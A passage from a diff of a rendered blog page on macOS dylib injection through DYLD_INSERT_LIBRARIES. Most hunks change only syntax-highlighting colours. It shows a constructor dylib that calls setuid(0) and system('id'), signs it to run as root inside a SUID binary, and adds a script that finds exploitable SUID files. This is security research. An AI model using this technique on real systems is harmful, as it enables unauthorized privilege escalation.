+</span></span><span style="display:flex;"><span>$ sudo chmod +s <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span>$ ls -l <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span>-rwsr-sr-x  <span style="color:#f60">1</span> root  staff  <span style="color:#f60">8432</span> Jul  <span style="color:#f60">8</span> 16:46 <span style="color:#366">test</span>
 </span></span><span style="display:flex;"><span>$ ./test 
 </span></span><span style="display:flex;"><span>Hello world
-</span></span><span style="display:flex;"><span>$ DYLD_INSERT_LIBRARIES<span style="color:#f92672">=</span>inject.dylib ./test
+</span></span><span style="display:flex;"><span>$ <span style="color:#033">DYLD_INSERT_LIBRARIES</span><span style="color:#555">=</span>inject.dylib ./test
 </span></span><span style="display:flex;"><span>Hello world
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#removing suid flag and running</span>
-</span></span><span style="display:flex;"><span>$ sudo chmod -s test
-</span></span><span style="display:flex;"><span>$ ls -l test
-</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#ae81ff">1</span> root  staff  <span style="color:#ae81ff">8432</span> Jul  <span style="color:#ae81ff">8</span> 16:46 test
-</span></span><span style="display:flex;"><span>$ DYLD_INSERT_LIBRARIES<span style="color:#f92672">=</span>inject.dylib ./test
+</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#removing suid flag and running</span>
+</span></span><span style="display:flex;"><span>$ sudo chmod -s <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span>$ ls -l <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span>-rwxr-xr-x  <span style="color:#f60">1</span> root  staff  <span style="color:#f60">8432</span> Jul  <span style="color:#f60">8</span> 16:46 <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span>$ <span style="color:#033">DYLD_INSERT_LIBRARIES</span><span style="color:#555">=</span>inject.dylib ./test
 </span></span><span style="display:flex;"><span>Hello from dylib!
 </span></span><span style="display:flex;"><span>Hello world
 </span></span></code></pre></div><p>Interestingly, in the past, there was an LPE bug from incorrectly handling one of the environment variables, and with SUID files, you could achieve privilege escalation, here you can read the details:
 <a href="https://www.sektioneins.de/blog/15-07-07-dyld_print_to_file_lpe.html"  class="external-link" target="_blank" rel="noopener">OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation Vulnerability | SektionEins GmbH</a></p>
 <p>I created a complete blank Cocoa App for testing the other stuff. I also export the environment variable, so we don’t need to specify it always:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export DYLD_INSERT_LIBRARIES<span style="color:#f92672">=</span>inject.dylib
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#366">export</span> <span style="color:#033">DYLD_INSERT_LIBRARIES</span><span style="color:#555">=</span>inject.dylib
 </span></span></code></pre></div><p>If we compile it, and run as default, we can see that dylib is injected:</p>
 <pre tabindex="0"><code>$ ./HelloWorldCocoa.app/Contents/MacOS/HelloWorldCocoa 
 Hello from dylib!
@@ -593,49 +593,49 @@ Internal requirements count=1 size=72
 
 $ DYLD_INSERT_LIBRARIES=inject.dylib /Applications/Utilities/Disk\ Utility.app/Contents/MacOS/Disk\ Utility 
 </code></pre><p>I would say that’s all, but no. Let’s go back to the fact that you can inject a dylib even to SUID files if the <code>CS_REQUIRE_LV</code> flag is set. (In fact probably also to files with the <code>CS_RUNTIME</code> flag). Yes, only dylibs with the same signature, but there is a potential (although small) for privilege escalation. To show, I modified my dylib:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;syslog.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__attribute__</span>((constructor))
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">customConstructor</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdio.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;syslog.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099">#include</span> <span style="color:#099">&lt;stdlib.h&gt;</span><span style="color:#099">
+</span></span></span><span style="display:flex;"><span><span style="color:#099"></span>
+</span></span><span style="display:flex;"><span><span style="color:#c0f">__attribute__</span>((constructor))
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">customConstructor</span>(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>argv)
 </span></span><span style="display:flex;"><span> {
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">setuid</span>(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span> 	<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;id&#34;</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hello from dylib!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">syslog</span>(LOG_ERR, <span style="color:#e6db74">&#34;Dylib injection successful in %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>	<span style="color:#c0f">setuid</span>(<span style="color:#f60">0</span>);
+</span></span><span style="display:flex;"><span> 	<span style="color:#c0f">system</span>(<span style="color:#c30">&#34;id&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#c0f">printf</span>(<span style="color:#c30">&#34;Hello from dylib!</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#c0f">syslog</span>(LOG_ERR, <span style="color:#c30">&#34;Dylib injection successful in %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>, argv[<span style="color:#f60">0</span>]);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Let’s sign this, and the test program with the same certificate and set the SUID bit for the test binary and run it. As we can see we can inject a dylib as expected and indeed it will run as root.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -dynamiclib inject.c -o inject.dylib
-</span></span><span style="display:flex;"><span>codesign -f -s <span style="color:#e6db74">&#34;Mac Developer: fitzl.csaba@gmail.com (M9UN3Y3UDG)&#34;</span> inject.dylib
-</span></span><span style="display:flex;"><span>codesign -f -s <span style="color:#e6db74">&#34;Mac Developer: fitzl.csaba@gmail.com (M9UN3Y3UDG)&#34;</span> -o library test
-</span></span><span style="display:flex;"><span>sudo chown root test
-</span></span><span style="display:flex;"><span>sudo chmod +s test
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc -dynamiclib inject.c -o inject.dylib
+</span></span><span style="display:flex;"><span>codesign -f -s <span style="color:#c30">&#34;Mac Developer: fitzl.csaba@gmail.com (M9UN3Y3UDG)&#34;</span> inject.dylib
+</span></span><span style="display:flex;"><span>codesign -f -s <span style="color:#c30">&#34;Mac Developer: fitzl.csaba@gmail.com (M9UN3Y3UDG)&#34;</span> -o library <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span>sudo chown root <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span>sudo chmod +s <span style="color:#366">test</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>ls -l test
-</span></span><span style="display:flex;"><span>-rwsr-sr-x  <span style="color:#ae81ff">1</span> root  staff  <span style="color:#ae81ff">26912</span> Jul  <span style="color:#ae81ff">9</span> 14:01 test
+</span></span><span style="display:flex;"><span>ls -l <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span>-rwsr-sr-x  <span style="color:#f60">1</span> root  staff  <span style="color:#f60">26912</span> Jul  <span style="color:#f60">9</span> 14:01 <span style="color:#366">test</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>codesign -dvvv test
-</span></span><span style="display:flex;"><span>Executable<span style="color:#f92672">=</span>/Users/csaby/Downloads/test
-</span></span><span style="display:flex;"><span>Identifier<span style="color:#f92672">=</span>test
-</span></span><span style="display:flex;"><span>Format<span style="color:#f92672">=</span>Mach-O thin <span style="color:#f92672">(</span>x86_64<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>CodeDirectory v<span style="color:#f92672">=</span><span style="color:#ae81ff">20200</span> size<span style="color:#f92672">=</span><span style="color:#ae81ff">228</span> flags<span style="color:#f92672">=</span>0x2000<span style="color:#f92672">(</span>library-validation<span style="color:#f92672">)</span> hashes<span style="color:#f92672">=</span>3+2 location<span style="color:#f92672">=</span>embedded
-</span></span><span style="display:flex;"><span>Hash type<span style="color:#f92672">=</span>sha256 size<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>
-</span></span><span style="display:flex;"><span>CandidateCDHash sha256<span style="color:#f92672">=</span>7d06a7229cbc476270e455cb3ef88bdddf109f12
-</span></span><span style="display:flex;"><span>Hash choices<span style="color:#f92672">=</span>sha256
-</span></span><span style="display:flex;"><span>CDHash<span style="color:#f92672">=</span>7d06a7229cbc476270e455cb3ef88bdddf109f12
-</span></span><span style="display:flex;"><span>Signature size<span style="color:#f92672">=</span><span style="color:#ae81ff">4703</span>
-</span></span><span style="display:flex;"><span>Authority<span style="color:#f92672">=</span>Mac Developer: fitzl.csaba@gmail.com <span style="color:#f92672">(</span>M9UN3Y3UDG<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>Authority<span style="color:#f92672">=</span>Apple Worldwide Developer Relations Certification Authority
-</span></span><span style="display:flex;"><span>Authority<span style="color:#f92672">=</span>Apple Root CA
-</span></span><span style="display:flex;"><span>Signed Time<span style="color:#f92672">=</span>2019. Jul 9. 14:01:03
-</span></span><span style="display:flex;"><span>Info.plist<span style="color:#f92672">=</span>not bound
-</span></span><span style="display:flex;"><span>TeamIdentifier<span style="color:#f92672">=</span>E7Q33VUH49
-</span></span><span style="display:flex;"><span>Sealed Resources<span style="color:#f92672">=</span>none
-</span></span><span style="display:flex;"><span>Internal requirements count<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> size<span style="color:#f92672">=</span><span style="color:#ae81ff">172</span>
+</span></span><span style="display:flex;"><span>codesign -dvvv <span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span><span style="color:#033">Executable</span><span style="color:#555">=</span>/Users/csaby/Downloads/test
+</span></span><span style="display:flex;"><span><span style="color:#033">Identifier</span><span style="color:#555">=</span><span style="color:#366">test</span>
+</span></span><span style="display:flex;"><span><span style="color:#033">Format</span><span style="color:#555">=</span>Mach-O thin <span style="color:#555">(</span>x86_64<span style="color:#555">)</span>
+</span></span><span style="display:flex;"><span>CodeDirectory <span style="color:#033">v</span><span style="color:#555">=</span><span style="color:#f60">20200</span> <span style="color:#033">size</span><span style="color:#555">=</span><span style="color:#f60">228</span> <span style="color:#033">flags</span><span style="color:#555">=</span>0x2000<span style="color:#555">(</span>library-validation<span style="color:#555">)</span> <span style="color:#033">hashes</span><span style="color:#555">=</span>3+2 <span style="color:#033">location</span><span style="color:#555">=</span>embedded
+</span></span><span style="display:flex;"><span>Hash <span style="color:#033">type</span><span style="color:#555">=</span>sha256 <span style="color:#033">size</span><span style="color:#555">=</span><span style="color:#f60">32</span>
+</span></span><span style="display:flex;"><span>CandidateCDHash <span style="color:#033">sha256</span><span style="color:#555">=</span>7d06a7229cbc476270e455cb3ef88bdddf109f12
+</span></span><span style="display:flex;"><span>Hash <span style="color:#033">choices</span><span style="color:#555">=</span>sha256
+</span></span><span style="display:flex;"><span><span style="color:#033">CDHash</span><span style="color:#555">=</span>7d06a7229cbc476270e455cb3ef88bdddf109f12
+</span></span><span style="display:flex;"><span>Signature <span style="color:#033">size</span><span style="color:#555">=</span><span style="color:#f60">4703</span>
+</span></span><span style="display:flex;"><span><span style="color:#033">Authority</span><span style="color:#555">=</span>Mac Developer: fitzl.csaba@gmail.com <span style="color:#555">(</span>M9UN3Y3UDG<span style="color:#555">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#033">Authority</span><span style="color:#555">=</span>Apple Worldwide Developer Relations Certification Authority
+</span></span><span style="display:flex;"><span><span style="color:#033">Authority</span><span style="color:#555">=</span>Apple Root CA
+</span></span><span style="display:flex;"><span>Signed <span style="color:#033">Time</span><span style="color:#555">=</span>2019. Jul 9. 14:01:03
+</span></span><span style="display:flex;"><span>Info.plist<span style="color:#555">=</span>not bound
+</span></span><span style="display:flex;"><span><span style="color:#033">TeamIdentifier</span><span style="color:#555">=</span>E7Q33VUH49
+</span></span><span style="display:flex;"><span>Sealed <span style="color:#033">Resources</span><span style="color:#555">=</span>none
+</span></span><span style="display:flex;"><span>Internal requirements <span style="color:#033">count</span><span style="color:#555">=</span><span style="color:#f60">1</span> <span style="color:#033">size</span><span style="color:#555">=</span><span style="color:#f60">172</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>./test 
-</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span> egid<span style="color:#f92672">=</span>20<span style="color:#f92672">(</span>staff<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>,1<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>,2<span style="color:#f92672">(</span>kmem<span style="color:#f92672">)</span>,3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>tty<span style="color:#f92672">)</span>,5<span style="color:#f92672">(</span>operator<span style="color:#f92672">)</span>,8<span style="color:#f92672">(</span>procview<span style="color:#f92672">)</span>,9<span style="color:#f92672">(</span>procmod<span style="color:#f92672">)</span>,12<span style="color:#f92672">(</span>everyone<span style="color:#f92672">)</span>,20<span style="color:#f92672">(</span>staff<span style="color:#f92672">)</span>,29<span style="color:#f92672">(</span>certusers<span style="color:#f92672">)</span>,61<span style="color:#f92672">(</span>localaccounts<span style="color:#f92672">)</span>,80<span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>,702<span style="color:#f92672">(</span>com.apple.sharepoint.group.2<span style="color:#f92672">)</span>,701<span style="color:#f92672">(</span>com.apple.sharepoint.group.1<span style="color:#f92672">)</span>,33<span style="color:#f92672">(</span>_appstore<span style="color:#f92672">)</span>,98<span style="color:#f92672">(</span>_lpadmin<span style="color:#f92672">)</span>,100<span style="color:#f92672">(</span>_lpoperator<span style="color:#f92672">)</span>,204<span style="color:#f92672">(</span>_developer<span style="color:#f92672">)</span>,250<span style="color:#f92672">(</span>_analyticsusers<span style="color:#f92672">)</span>,395<span style="color:#f92672">(</span>com.apple.access_ftp<span style="color:#f92672">)</span>,398<span style="color:#f92672">(</span>com.apple.access_screensharing<span style="color:#f92672">)</span>,399<span style="color:#f92672">(</span>com.apple.access_ssh<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#033">uid</span><span style="color:#555">=</span>0<span style="color:#555">(</span>root<span style="color:#555">)</span> <span style="color:#033">gid</span><span style="color:#555">=</span>0<span style="color:#555">(</span>wheel<span style="color:#555">)</span> <span style="color:#033">egid</span><span style="color:#555">=</span>20<span style="color:#555">(</span>staff<span style="color:#555">)</span> <span style="color:#033">groups</span><span style="color:#555">=</span>0<span style="color:#555">(</span>wheel<span style="color:#555">)</span>,1<span style="color:#555">(</span>daemon<span style="color:#555">)</span>,2<span style="color:#555">(</span>kmem<span style="color:#555">)</span>,3<span style="color:#555">(</span>sys<span style="color:#555">)</span>,4<span style="color:#555">(</span>tty<span style="color:#555">)</span>,5<span style="color:#555">(</span>operator<span style="color:#555">)</span>,8<span style="color:#555">(</span>procview<span style="color:#555">)</span>,9<span style="color:#555">(</span>procmod<span style="color:#555">)</span>,12<span style="color:#555">(</span>everyone<span style="color:#555">)</span>,20<span style="color:#555">(</span>staff<span style="color:#555">)</span>,29<span style="color:#555">(</span>certusers<span style="color:#555">)</span>,61<span style="color:#555">(</span>localaccounts<span style="color:#555">)</span>,80<span style="color:#555">(</span>admin<span style="color:#555">)</span>,702<span style="color:#555">(</span>com.apple.sharepoint.group.2<span style="color:#555">)</span>,701<span style="color:#555">(</span>com.apple.sharepoint.group.1<span style="color:#555">)</span>,33<span style="color:#555">(</span>_appstore<span style="color:#555">)</span>,98<span style="color:#555">(</span>_lpadmin<span style="color:#555">)</span>,100<span style="color:#555">(</span>_lpoperator<span style="color:#555">)</span>,204<span style="color:#555">(</span>_developer<span style="color:#555">)</span>,250<span style="color:#555">(</span>_analyticsusers<span style="color:#555">)</span>,395<span style="color:#555">(</span>com.apple.access_ftp<span style="color:#555">)</span>,398<span style="color:#555">(</span>com.apple.access_screensharing<span style="color:#555">)</span>,399<span style="color:#555">(</span>com.apple.access_ssh<span style="color:#555">)</span>
 </span></span><span style="display:flex;"><span>Hello from dylib!
 </span></span><span style="display:flex;"><span>Hello world 
 </span></span></code></pre></div><p>In theory you need one of the following to exploit this:</p>
@@ -644,29 +644,29 @@ $ DYLD_INSERT_LIBRARIES=inject.dylib /Applications/Utilities/Disk\ Utility.app/C
 <li>Have write access to the folder, where the file with SUID bit present -&gt; in this case you can sign the file with your own certificate (code sign will replace the file you sign, so it will delete the original and create a new - this is possible because on *nix systems you can delete files from directories, where you are the owner even if the file is owned by root), wait for the SUID bit to be restored (fingers crossed) and finally inject your own dylib. You would think that such scenario wouldn’t exist, but I did find an example for it.</li>
 </ol>
 <p>Here is a quick and dirty python script to find #2 items, mostly put together from StackOverflow :D</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#!/usr/bin/python3</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> getpass
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pathlib <span style="color:#f92672">import</span> Path
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">os</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">getpass</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pathlib</span> <span style="color:#069;font-weight:bold">import</span> Path
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>binaryPaths <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;/Applications/GNS3/Resources/&#39;</span>)
-</span></span><span style="display:flex;"><span>username <span style="color:#f92672">=</span> getpass<span style="color:#f92672">.</span>getuser()
+</span></span><span style="display:flex;"><span>binaryPaths <span style="color:#555">=</span> (<span style="color:#c30">&#39;/Applications/GNS3/Resources/&#39;</span>)
+</span></span><span style="display:flex;"><span>username <span style="color:#555">=</span> getpass<span style="color:#555">.</span>getuser()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> binaryPath <span style="color:#f92672">in</span> binaryPaths:
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> rootDir,subDirs,subFiles <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>walk(binaryPath):
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> subFile <span style="color:#f92672">in</span> subFiles:
-</span></span><span style="display:flex;"><span>			absPath <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(rootDir,subFile)
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>				permission <span style="color:#f92672">=</span> oct(os<span style="color:#f92672">.</span>stat(absPath)<span style="color:#f92672">.</span>st_mode)[<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>:]
-</span></span><span style="display:flex;"><span>				specialPermission <span style="color:#f92672">=</span> permission[<span style="color:#ae81ff">0</span>]
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">if</span> int(specialPermission) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">4</span>:
-</span></span><span style="display:flex;"><span>					p <span style="color:#f92672">=</span> Path(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>abspath(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(absPath, os<span style="color:#f92672">.</span>pardir)))
-</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> p<span style="color:#f92672">.</span>owner() <span style="color:#f92672">==</span> username:
-</span></span><span style="display:flex;"><span>						print(<span style="color:#e6db74">&#34;Potential issue found, owner of parent folder is:&#34;</span>, username)
-</span></span><span style="display:flex;"><span>						print(permission , absPath)
-</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> binaryPath <span style="color:#000;font-weight:bold">in</span> binaryPaths:
+</span></span><span style="display:flex;"><span>	<span style="color:#069;font-weight:bold">for</span> rootDir,subDirs,subFiles <span style="color:#000;font-weight:bold">in</span> os<span style="color:#555">.</span>walk(binaryPath):
+</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">for</span> subFile <span style="color:#000;font-weight:bold">in</span> subFiles:
+</span></span><span style="display:flex;"><span>			absPath <span style="color:#555">=</span> os<span style="color:#555">.</span>path<span style="color:#555">.</span>join(rootDir,subFile)
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">try</span>:
+</span></span><span style="display:flex;"><span>				permission <span style="color:#555">=</span> <span style="color:#366">oct</span>(os<span style="color:#555">.</span>stat(absPath)<span style="color:#555">.</span>st_mode)[<span style="color:#555">-</span><span style="color:#f60">4</span>:]
+</span></span><span style="display:flex;"><span>				specialPermission <span style="color:#555">=</span> permission[<span style="color:#f60">0</span>]
+</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">if</span> <span style="color:#366">int</span>(specialPermission) <span style="color:#555">&gt;=</span> <span style="color:#f60">4</span>:
+</span></span><span style="display:flex;"><span>					p <span style="color:#555">=</span> Path(os<span style="color:#555">.</span>path<span style="color:#555">.</span>abspath(os<span style="color:#555">.</span>path<span style="color:#555">.</span>join(absPath, os<span style="color:#555">.</span>pardir)))
+</span></span><span style="display:flex;"><span>					<span style="color:#069;font-weight:bold">if</span> p<span style="color:#555">.</span>owner() <span style="color:#555">==</span> username:
+</span></span><span style="display:flex;"><span>						<span style="color:#366">print</span>(<span style="color:#c30">&#34;Potential issue found, owner of parent folder is:&#34;</span>, username)
+</span></span><span style="display:flex;"><span>						<span style="color:#366">print</span>(permission , absPath)
+</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">except</span>:
+</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">pass</span>
 </span></span></code></pre></div><p>One last thought on this topic is GateKeeper. You can inject quarantine flagged binaries in Mojave, which in fact is pretty much expected.</p>
 <pre tabindex="0"><code>$ ./test 
 uid=0(root) gid=0(wheel) egid=20(staff) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),702(com.apple.sharepoint.group.2),701(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
